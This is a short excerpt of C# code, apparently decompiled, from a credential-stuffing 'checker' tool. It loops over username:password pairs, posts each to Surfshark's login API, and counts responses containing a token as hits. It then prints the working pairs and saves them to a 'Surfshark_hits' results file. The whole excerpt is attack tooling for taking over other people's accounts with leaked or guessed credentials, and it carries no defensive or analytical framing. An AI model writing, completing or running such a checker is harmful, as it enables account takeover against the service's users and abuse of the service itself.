        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str2 = httpRequest.Post("https://api.surfshark.com/v1/auth/login", str1, "application/json;charset=UTF-8").ToString();
              if (str2.Contains("{\"token") || str2.Contains("200"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - SURFSHARK] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Surfshark_hits", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
